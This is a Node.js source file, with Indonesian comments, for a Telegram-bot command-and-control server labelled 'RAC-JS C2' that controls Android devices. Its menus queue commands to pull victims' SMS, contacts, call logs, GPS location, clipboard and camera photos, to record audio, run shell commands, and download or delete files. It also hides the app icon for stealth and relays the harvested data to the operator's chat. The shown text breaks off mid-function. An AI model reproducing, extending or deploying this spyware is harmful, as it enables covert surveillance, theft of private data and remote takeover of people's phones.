require('dotenv').config();
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// Direktori Upload Statik untuk Media
const uploadsDir = path.join(__dirname, 'public/uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');


/** ===================================
 * CONFIGURATION SETUP
 * =================================== */
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'my-secret-token';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const PORT = process.env.PORT || 3000;
const ALLOWED_IDS = (process.env.ALLOWED_IDS || '').split(',').map(id => id.trim()).filter(id => id.length > 0);

const app = express();


/** ===================================
 * DATABASE SETUP (SQLITE)
 * =================================== */
let db;
(async () => {
    try {
        db = await open({
            filename: path.join(__dirname, 'database.sqlite'),
            driver: sqlite3.Database
        });

        // Buat Tabel jika belum ada
        await db.exec(`CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, 
            last_seen REAL DEFAULT 0,
            polling_mode TEXT DEFAULT 'turbo',
            info TEXT,
            ipv6 TEXT,
            ipv4 TEXT
        )`);

        await db.exec(`CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            device_id TEXT,
            command TEXT,
            text TEXT,
            status TEXT DEFAULT 'pending',
            chat_id TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            completed_at DATETIME,
            polling_mode TEXT DEFAULT 'normal'
        )`);

        // Tambah kolom jika dari versi sebelumnya belum ada
        try { await db.exec(`ALTER TABLE devices ADD COLUMN polling_mode TEXT DEFAULT 'turbo'`); } catch (e) { }
        try { await db.exec(`ALTER TABLE devices ADD COLUMN ipv6 TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE devices ADD COLUMN ipv4 TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN polling_mode TEXT DEFAULT 'normal'`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN completed_at DATETIME`); } catch (e) { }

        await db.exec(`CREATE TABLE IF NOT EXISTS system_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command_id TEXT,
            level TEXT DEFAULT 'INFO',
            message TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);

        // Server baru boleh mendengarkan setelah DB SIAP
        app.listen(PORT, () => {
            console.log(`Server Node.js berjalan di port ${PORT}`);
        });
    } catch (dbErr) {
        console.error("KRITIKAL: Gagal inisialisasi Database!", dbErr);
        process.exit(1);
    }
})();

// --- MIDDLEWARE ---
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'templates'));
// Ekspos folder public agar bisa diakses browser
app.use('/public', express.static(path.join(__dirname, 'public')));

// Helper function
const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null, ipv4 = null, isOffline = false) => {
    const timestamp = isOffline ? 0 : Date.now() / 1000;
    const finalMode = (mode === 'short' || mode === 'turbo') ? 'turbo' : 'normal';

    // PENTING: polling_mode hanya di-set saat INSERT device baru.
    // Saat UPDATE (ON CONFLICT), polling_mode TIDAK ditimpa agar perubahan
    // dari admin (set_polling_mode) tidak teroverwrite oleh polling perangkat.
    if (ipv6 || ipv4) {
        await db.run('INSERT INTO devices (id, last_seen, polling_mode, ipv6, ipv4) VALUES (?, ?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, ipv6=excluded.ipv6, ipv4=excluded.ipv4',
            [deviceId, timestamp, finalMode, ipv6, ipv4]);
    } else {
        await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen',
            [deviceId, timestamp, finalMode]);
    }
};

// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
const escapeHTML = (str) => {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
};

const formatDeviceResponse = (data) => {
    if (data === null || data === undefined) return '\n└ [Kosong]';
    if (typeof data === 'string') return `\n└ <code>${escapeHTML(data)}</code>`;

    // SMS Inbox / SMS List
    if (['sms_inbox', 'sms_list'].includes(data.type) && Array.isArray(data.data)) {
        return '\n' + data.data.map((sms, i) => {
            const sender = sms.from || sms.address || 'Unknown';
            const body = sms.body || sms.message || '';
            return `${i + 1}. 📩 <b>${escapeHTML(sender)}</b>\n   └ ${escapeHTML(body)}`;
        }).join('\n\n');
    }

    // Contact List
    if (['contact_list', 'contacts'].includes(data.type) && Array.isArray(data.data)) {
        return '\n' + data.data.map((c, i) => {
            return `${i + 1}. 👤 <b>${escapeHTML(c.name || 'Unknown')}</b>\n   └ 📞 <code>${escapeHTML(c.number || c.phone || '-')}</code>`;
        }).join('\n\n');
    }

    // Call Logs
    if (['call_logs', 'calls'].includes(data.type) && Array.isArray(data.data)) {
        return '\n' + data.data.map((c, i) => {
            let icon = '📞';
            if (['INCOMING', '1'].includes(String(c.type))) icon = '📥';
            else if (['OUTGOING', '2'].includes(String(c.type))) icon = '📤';
            else if (['MISSED', '3'].includes(String(c.type))) icon = '❌';
            return `${i + 1}. ${icon} <b>${escapeHTML(c.name || c.number || 'Unknown')}</b>\n   └ <code>${escapeHTML(c.number)}</code> | ⏳ <code>${c.duration_sec || c.duration || 0}s</code>`;
        }).join('\n\n');
    }

    // WiFi Scan
    if (data.type === 'wifi_networks' && Array.isArray(data.data)) {
        let sorted = [...data.data].sort((a, b) => (b.level || b.signal || 0) - (a.level || a.signal || 0));
        const uniqueSsids = new Set();
        const filtered = sorted.filter(wifi => {
            const ssid = wifi.ssid || wifi.SSID || '[Hidden SSID]';
            if (uniqueSsids.has(ssid)) return false;
            uniqueSsids.add(ssid);
            return true;
        });

        return '\n' + filtered.map((wifi, idx) => {
            const ss = (wifi.level || wifi.signal || 0);
            let icon = '📶🔴';
            if (ss >= -50) icon = '📶🔵';
            else if (ss >= -65) icon = '📶🟢';
            else if (ss >= -80) icon = '📶🟡';
            const ssid = wifi.ssid || wifi.SSID || '[Hidden SSID]';
            const bssid = wifi.bssid || wifi.BSSID || '-';
            const freq = (wifi.frequency || wifi.freq || '') ? ` | ${wifi.frequency || wifi.freq} MHz` : '';
            return `${idx + 1}. ${icon} <b>${escapeHTML(ssid)}</b>\n   └ <code>${ss} dBm</code> | 📍 <code>${escapeHTML(bssid)}</code>${freq}`;
        }).join('\n\n');
    }

    if (Array.isArray(data)) {
        if (data.length === 0) return '\n└ [Data Kosong]';
        return '\n' + data.map((item, idx) => {
            const prefix = `${idx + 1}. `;
            if (typeof item === 'object' && item !== null) {
                return prefix + Object.entries(item)
                    .map(([k, v]) => `<b>${escapeHTML(k)}</b>: <code>${escapeHTML(v)}</code>`)
                    .join(' | ');
            }
            return prefix + `<code>${escapeHTML(item)}</code>`;
        }).join('\n');
    }

    if (typeof data === 'object') {
        return '\n' + Object.entries(data)
            .map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: <code>${escapeHTML(v)}</code>`)
            .join('\n');
    }

    return `\n└ <code>${escapeHTML(data)}</code>`;
};

// State Memori
const devicePaths = {};
const pathMap = {};
const lsState = {};
const activeInput = {};
const lastNavMessage = {};

const clearPreviousNav = async (chatId) => {
    if (lastNavMessage[chatId] && bot) {
        try {
            await bot.telegram.editMessageReplyMarkup(chatId, lastNavMessage[chatId], null, { inline_keyboard: [] });
        } catch (e) { }
        delete lastNavMessage[chatId];
    }
};

const trackNav = (chatId, msgId) => {
    lastNavMessage[chatId] = msgId;
};

const commandsWithArgs = {
    'sms_send': 'Masukkan Detail SMS (Format: Nomor|Pesan):',
    'show_toast': 'Masukkan teks Toast yang ingin dimunculkan:',
    'vibrate': 'Berapa detik getaran dilakukan? (Angka):',
    'tts': 'Masukkan teks untuk diucapkan (TTS):',
    'notify': 'Masukkan Push Notification (Format: Judul|Isi):',
    'record_sound': 'Berapa detik durasi rekaman? (Angka):',
    'get_call_logs': 'Berapa banyak limit histori yang ditarik? (Angka):',
    'open_url': 'Masukkan URL yang ingin dibuka secara paksa:',
    'set_wallpaper': 'Masukkan URL Gambar untuk Wallpaper baru:',
    'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
    'shell': 'Masukkan perintah Shell/Terminal:',
    'torch': 'Masukkan status Torch (on/off):',
    'set_volume': 'Masukkan format [tipe] [angka] (Cth: music 10) atau ketik "get" untuk cek status:',
    'rm': 'Masukkan path file/folder yang ingin DIHAPUS PERMANEN:',
    'mv': 'Masukkan format [path_asal]|[path_baru] untuk Move/Rename:',
    'find': 'Masukkan format [root_path]|[ekstensi] (Cth: /storage/emulated/0|.jpg):',
    'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
};

const clearActiveInput = (ctx) => {
    const chatId = ctx.chat?.id || ctx.message?.chat?.id || ctx.callbackQuery?.message?.chat?.id;
    if (chatId && activeInput[chatId]) {
        delete activeInput[chatId];
    }
};

const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) => {
    const state = lsState[client_id];
    if (!state) return;

    state.page = pageNum;
    const itemsPerPage = 30;
    const startIndex = (pageNum - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const pageItems = state.items.slice(startIndex, endIndex);

    const upPath = state.path.substring(0, state.path.lastIndexOf('/')) || '/';
    const flatBtns = [];

    const navBar = [];
    if (state.path !== '/') {
        const upId = Math.random().toString(36).substring(2, 10);
        pathMap[upId] = upPath;
        navBar.push(Markup.button.callback('⬆️ Naik', 'runcmd:' + client_id + ':ls_id ' + upId));
    }
    const findPathId = Math.random().toString(36).substring(2, 10);
    pathMap[findPathId] = state.path;
    navBar.push(Markup.button.callback('🔍 Cari (.ext)', 'runcmd:' + client_id + ':find_id ' + findPathId));
    flatBtns.push(navBar);

    for (let i = 0; i < pageItems.length; i += 2) {
        const row = [];
        [pageItems[i], pageItems[i + 1]].forEach(f => {
            if (!f) return;
            const shortId = Math.random().toString(36).substring(2, 10);
            pathMap[shortId] = f.path;
            if (f.is_dir) {
                row.push(Markup.button.callback('📁 ' + f.name.substring(0, 18), 'runcmd:' + client_id + ':ls_id ' + shortId));
            } else {
                row.push(Markup.button.callback('📄 ' + f.name.substring(0, 15), 'file_menu:' + client_id + ':' + shortId));
            }
        });
        flatBtns.push(row);
    }

    const inlineBtns = [...flatBtns];
    const navBtns = [];
    if (pageNum > 1) navBtns.push(Markup.button.callback('⬅️ Prev', `pagecmd:${client_id}:${pageNum - 1}`));
    if (pageNum < state.totalPages) navBtns.push(Markup.button.callback('Next ➡️', `pagecmd:${client_id}:${pageNum + 1}`));
    if (navBtns.length > 0) inlineBtns.push(navBtns);

    inlineBtns.push([
        { text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}`, style: 'primary' },
        { text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }
    ]);

    const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;

    await clearPreviousNav(chat_id);

    try {
        let sent;
        if (message_id) {
            sent = await bot.telegram.editMessageText(chat_id, parseInt(message_id), null, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
        } else {
            sent = await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
        }
        if (sent?.message_id) trackNav(chat_id, sent.message_id);
    } catch (tgErr) {
        const sent = await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
        if (sent?.message_id) trackNav(chat_id, sent.message_id);
    }
};


/** ===================================
 * TELEGRAM COMMAND & CONTROL (BOT)
 * =================================== */
let bot;
let lastSelectedDevice = null;
if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
    bot = new Telegraf(TELEGRAM_TOKEN);

    bot.use(async (ctx, next) => {
        if (!ctx.from) return;
        const userId = ctx.from.id.toString();
        if (ALLOWED_IDS.length > 0 && !ALLOWED_IDS.includes(userId)) {
            return;
        }
        return next();
    });

    try {
        bot.telegram.setMyCommands([
            { command: 'start', description: 'Lihat menu utama bot' },
            { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
            { command: 'help', description: 'Bantuan & Daftar Perintah Lanjutan' },
            { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
        ]).catch(err => console.error("Gagal mendaftarkan menu perintah:", err.message));
    } catch (e) { }

    const sendHelpMessage = (ctx) => {
        const helpText = `
📖 <b>Daftar Eksekusi Perintah (RAC-JS C2)</b>

Format Eksekusi Manual:
<code>/cmd [id_device] [command] [payload_opsional]</code>

⚙️ <b>Utilitas Dasar</b>
• <b>ping</b>: Uji latensi interval.
• <b>get_device_info</b>: Spesifikasi fisik.
• <b>get_battery</b>: Status baterai.
• <b>set_volume</b>: Metrik audio.
• <b>set_web_server</b>: Toggle Web Server Lokal (on/off).
• <b>hide_app</b> / <b>unhide_app</b>: Kamuflase ikon.
• <b>lock_screen</b>: Kunci layar perangkat.
• <b>screen_on</b>: Hidupkan layar paksa.

🛠️ <b>Hardware & Lingkungan</b>
• <b>vibrate</b> / <b>torch</b> / <b>sensors</b>
• <b>wifi_scan</b> / <b>location</b>

📸 <b>Media Audio & Visual</b>
• <b>photo front/back</b> / <b>record_sound</b>
• <b>play_sound</b> / <b>tts</b> / <b>play_alarm</b>

🗂️ <b>Manajemen Data (I/O)</b>
• <b>contacts</b> / <b>sms_list</b> / <b>get_call_logs</b>
• <b>sms_send</b> / <b>clipboard</b> / <b>app_list</b>
• <b>ls</b> / <b>upload</b> / <b>download</b> / <b>shell</b>
• <b>rm</b> / <b>mv</b> / <b>find</b>

📱 <b>Notifikasi & Layar</b>
• <b>show_toast</b> / <b>notify</b> / <b>open_url</b> / <b>set_wallpaper</b>
`;
        ctx.reply(helpText, { parse_mode: 'HTML' });
    };

    bot.command('help', sendHelpMessage);
    bot.action('btn_help', async (ctx) => {
        ctx.answerCbQuery();
        sendHelpMessage(ctx);
    });

    bot.start(async (ctx) => {
        clearActiveInput(ctx);
        const chatId = ctx.chat.id;
        await clearPreviousNav(chatId);
        const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
        const sent = await ctx.reply(msg, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')],
                [Markup.button.callback('📖 Bantuan & Dokumentasi', 'btn_help')]
            ])
        });
        trackNav(chatId, sent.message_id);
    });

    bot.command('list', async (ctx) => {
        clearActiveInput(ctx);
        await clearPreviousNav(ctx.chat.id);
        listDevicesToChat(ctx);
    });
    bot.action('btn_list', async (ctx) => {
        ctx.answerCbQuery();
        await clearPreviousNav(ctx.chat.id);
        listDevicesToChat(ctx);
    });

    const listDevicesToChat = async (ctx) => {
        const devices = await db.all('SELECT * FROM devices');
        const isCallback = !!ctx.callbackQuery;
        const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;

        if (devices.length === 0) {
            const msg = '📭 Belum ada perangkat yang terhubung ke server.';
            const sent = isCallback ? await ctx.editMessageText(msg) : await ctx.reply(msg);
            if (sent?.message_id) trackNav(chatId, sent.message_id);
            return;
        }

        const buttons = devices.map(d => {
            const isOnline = (Date.now() / 1000 - d.last_seen) < 90;
            const statusIcon = isOnline ? '🟢' : '🔴';
            const modeIcon = (d.polling_mode === 'short' || d.polling_mode === 'turbo') ? '⚡' : '🔋';
            return [{ text: `${statusIcon} ${d.id} [${modeIcon}]`, callback_data: `select_dev:${d.id}` }];
        });

        const caption = '📱 <b>Pilih Target Perangkat:</b>';
        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } };

        try {
            const sent = isCallback ? await ctx.editMessageText(caption, opts) : await ctx.reply(caption, opts);
            if (sent?.message_id) trackNav(chatId, sent.message_id);
        } catch (e) {
            const sent = await ctx.reply(caption, opts);
            if (sent?.message_id) trackNav(chatId, sent.message_id);
        }
    };

    bot.action('list_devices', async (ctx) => {
        clearActiveInput(ctx);
        ctx.answerCbQuery().catch(() => { });
        listDevicesToChat(ctx);
    });

    const sendDeviceMenu = async (ctx, devId, isSecret = false) => {
        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const currentMode = (device?.polling_mode === 'short' || device?.polling_mode === 'turbo') ? 'turbo' : 'normal';
        const modeLabel = currentMode === 'turbo' ? '⚡ TURBO' : '🔋 NORMAL';
        const nextMode = currentMode === 'turbo' ? 'normal' : 'turbo';

        let menuBtns = [];
        if (!isSecret) {
            // --- MENU UTAMA: Status & Akses Cepat ---
            menuBtns = [
                [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
                [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }],
                [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
                [{ text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
                [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
                [{ text: '🛠 Fitur Lanjutan', callback_data: `secret_menu:${devId}`, style: 'danger' }]
            ];
        } else {
            // --- FITUR LANJUTAN: Kontrol & Data Sensitif ---
            menuBtns = [
                [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
                [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial', callback_data: `runcmd:${devId}:dial_number` }],
                [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch', callback_data: `runcmd:${devId}:torch` }, { text: '📳 Getar', callback_data: `runcmd:${devId}:vibrate` }],
                [{ text: '🗣 TTS', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Notify', callback_data: `runcmd:${devId}:notify` }, { text: '💬 Toast', callback_data: `runcmd:${devId}:show_toast` }],
                [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }, { text: '🎵 Sound', callback_data: `runcmd:${devId}:play_sound` }],
                [{ text: '📻 Volume', callback_data: `runcmd:${devId}:set_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:app_list` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
                [{ text: '🔐 Lock', callback_data: `runcmd:${devId}:lock_screen`, style: 'danger' }, { text: '💡 Wake', callback_data: `runcmd:${devId}:screen_on`, style: 'danger' }],
                [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }],
                [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}`, style: 'success' }]
            ];
        }

        const rawText = ctx.callbackQuery?.message?.text || '';
        // Deteksi apakah pesan saat ini berisi hasil/respon agar tidak tertimpa
        const isResult = rawText && (
            rawText.includes('Respon') ||
            rawText.includes('Data') ||
            rawText.includes('Berhasil') ||
            rawText.includes('Jepretan') ||
            rawText.includes('Rekaman') ||
            rawText.includes('Hasil') ||
            rawText.includes('📍 Lokasi')
        );

        const greeting = `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;

        // Jika ada hasil, tempelkan menu di bawah hasil tersebut
        let caption = greeting;
        if (isResult) {
            const oldContent = rawText.split('🎯 Menu')[0].replace('⏳ Menunggu Respon...', '').trim();
            caption = `${oldContent}\n\n${greeting}`;
        }

        menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };

        const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
        await clearPreviousNav(chatId);

        try {
            const sent = await ctx.editMessageText(caption, opts);
            if (sent?.message_id) trackNav(chatId, sent.message_id);
        } catch (e) {
            const sent = await ctx.reply(caption, opts);
            if (sent?.message_id) trackNav(chatId, sent.message_id);
        }
    };

    bot.action(/^select_dev:(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        clearActiveInput(ctx);
        lastSelectedDevice = devId;
        ctx.answerCbQuery().catch(() => { });
        devicePaths[devId] = "/storage/emulated/0";
        sendDeviceMenu(ctx, devId, false);
    });

    bot.action(/^secret_menu:(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        clearActiveInput(ctx);
        ctx.answerCbQuery('Membuka Fitur Lanjutan...').catch(() => { });
        sendDeviceMenu(ctx, devId, true);
    });

    bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        lastSelectedDevice = devId;
        const fullCmd = ctx.match[2];
        const parts = fullCmd.split(' ');
        const cmdName = parts[0];
        let cmdText = parts.slice(1).join(' ');

        // Handler khusus: set_polling_mode langsung update DB tanpa antrian command
        if (cmdName === 'set_polling_mode') {
            const newMode = (cmdText === 'turbo' || cmdText === 'short') ? 'turbo' : 'normal';
            const modeLabel = newMode === 'turbo' ? '⚡ TURBO' : '🔋 NORMAL';
            try {
                const result = await db.run('UPDATE devices SET polling_mode = ? WHERE id = ?', [newMode, devId]);
                if (result.changes === 0) {
                    ctx.answerCbQuery('❌ Perangkat tidak ditemukan').catch(() => { });
                    return;
                }
                ctx.answerCbQuery(`✅ Mode diubah ke ${modeLabel}`).catch(() => { });
                // Refresh menu agar label mode terupdate
                await sendDeviceMenu(ctx, devId, false);
            } catch (e) {
                ctx.answerCbQuery('❌ Gagal mengubah mode').catch(() => { });
            }
            return;
        }

        // Logika Khusus: find_id butuh input user untuk ekstensi
        if (cmdName === 'find_id' && !cmdText.includes('|')) {
            const mappedPath = pathMap[cmdText];
            if (!mappedPath) return ctx.answerCbQuery('❌ Sesi explorer kedaluwarsa');

            activeInput[ctx.chat.id] = { devId, command: 'find', findRoot: mappedPath };
            const cancelBtn = {
                inline_keyboard: [[{ text: '🔙 Batal', callback_data: `select_dev:${devId}` }]]
            };
            const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
            await clearPreviousNav(chatId);
            const sent = await ctx.reply(`🔍 <b>Recursive Search</b>\n📍 Root: <code>${escapeHTML(mappedPath)}</code>\n\nMasukkan ekstensi file yang dicari (Cth: <code>.jpg</code> atau <code>*</code> untuk semua):`, { parse_mode: 'HTML', reply_markup: cancelBtn });
            trackNav(chatId, sent.message_id);
            return;
        }

        if (commandsWithArgs[cmdName] && !cmdText) {
            activeInput[ctx.chat.id] = { devId, command: cmdName };
            const cancelBtn = {
                inline_keyboard: [
                    [{ text: '🔙 Menu Utama', callback_data: `select_dev:${devId}` }],
                    [{ text: '❌ Batal / Tutup', callback_data: 'cancel_input' }]
                ]
            };
            const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
            await clearPreviousNav(chatId);
            const sent = await ctx.reply(`⌨️ <b>Mode Interaktif: [${cmdName}]</b>\nTarget: <code>${devId}</code>\n\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML', reply_markup: cancelBtn });
            trackNav(chatId, sent.message_id);
            return;
        }

        if (cmdName === 'ls_id' || cmdName === 'dl_id' || cmdName === 'rm_id' || cmdName === 'find_id') {
            const mappedPath = pathMap[cmdText];
            if (!mappedPath) return ctx.answerCbQuery('❌ Sesi explorer kedaluwarsa');
            cmdText = mappedPath;
        }

        const realCmdName = cmdName === 'ls_id' ? 'ls' : (cmdName === 'dl_id' ? 'download' : (cmdName === 'rm_id' ? 'rm' : (cmdName === 'find_id' ? 'find' : cmdName)));
        if (realCmdName === 'ls' && cmdText) devicePaths[devId] = cmdText;

        ctx.answerCbQuery(`Menjalankan ${realCmdName}...`).catch(() => { });
        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.callbackQuery.message.chat.id.toString();

        const sentMsg = await ctx.reply(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>`, { parse_mode: 'HTML' });
        const messageId = sentMsg.message_id.toString();

        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const currentMode = device?.polling_mode || 'normal';
        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
            [cmdId, devId, realCmdName, cmdText, 'pending', chatId, messageId, currentMode]);

        notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });
    });

    bot.action(/^file_menu:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        const shortId = ctx.match[2];
        const filePath = pathMap[shortId];
        if (!filePath) return ctx.answerCbQuery('❌ Sesi kedaluwarsa.');

        const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
        const caption = `📄 <b>File:</b> <code>${escapeHTML(fileName)}</code>\n📍 <b>Path:</b> <code>${escapeHTML(filePath)}</code>`;
        const parentPath = filePath.substring(0, filePath.lastIndexOf('/')) || '/';
        const parentId = Math.random().toString(36).substring(2, 10);
        pathMap[parentId] = parentPath;

        const menu = [
            [{ text: '📥 Download', callback_data: `runcmd:${devId}:dl_id ${shortId}` }],
            [{ text: '✏️ Rename / Move', callback_data: `rename_init:${devId}:${shortId}` }, { text: '🗑 Hapus', callback_data: `runcmd:${devId}:rm_id ${shortId}` }],
            [{ text: '🔙 Kembali ke Folder', callback_data: `runcmd:${devId}:ls_id ${parentId}` }]
        ];

        await clearPreviousNav(ctx.chat.id);
        const sent = await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: menu } });
        trackNav(ctx.chat.id, sent.message_id);
    });

    bot.action(/^rename_init:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        const shortId = ctx.match[2];
        const filePath = pathMap[shortId];
        if (!filePath) return ctx.answerCbQuery('❌ Sesi kedaluwarsa.');
        activeInput[ctx.chat.id] = { devId, command: 'mv_finish', srcPath: filePath };
        const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
        const cancelBtn = { inline_keyboard: [[{ text: '🔙 Batal', callback_data: `file_menu:${devId}:${shortId}` }]] };
        await clearPreviousNav(ctx.chat.id);
        const sent = await ctx.reply(`✏️ <b>Rename / Move</b>\nAsal: <code>${escapeHTML(fileName)}</code>\n\nMasukkan nama baru:`, { parse_mode: 'HTML', reply_markup: cancelBtn });
        trackNav(ctx.chat.id, sent.message_id);
    });

    bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        const pageNum = parseInt(ctx.match[2]);
        if (!lsState[devId]) return ctx.answerCbQuery('❌ Sesi kedaluwarsa');
        ctx.answerCbQuery(`Halaman ${pageNum}`);
        await sendExplorerPage(devId, pageNum, ctx.chat.id, ctx.callbackQuery.message.message_id);
    });

    bot.action('cancel_input', async (ctx) => {
        clearActiveInput(ctx);
        ctx.answerCbQuery('Dibatalkan');
        try { await ctx.deleteMessage(); } catch (e) { }
    });

    bot.on('text', async (ctx, next) => {
        const chatId = ctx.chat.id;
        const state = activeInput[chatId];
        if (ctx.message.text.startsWith('/')) return next();

        if (state) {
            let { devId, command, srcPath, findRoot } = state;
            let finalPayload = ctx.message.text;

            if (command === 'mv_finish') {
                command = 'mv';
                let dest = ctx.message.text;
                if (!dest.startsWith('/')) {
                    const parentDir = srcPath.substring(0, srcPath.lastIndexOf('/'));
                    dest = parentDir + '/' + dest;
                }
                finalPayload = `${srcPath}|${dest}`;
                delete activeInput[chatId];
            } else if (command === 'find' && findRoot) {
                finalPayload = `${findRoot}|${ctx.message.text}`;
                delete activeInput[chatId];
            }

            const cmdId = uuidv4().slice(0, 8);
            await clearPreviousNav(chatId);
            const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code>...`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: '🔙 Selesai', callback_data: `select_dev:${devId}` }]] }
            });
            trackNav(chatId, sentMsg.message_id);

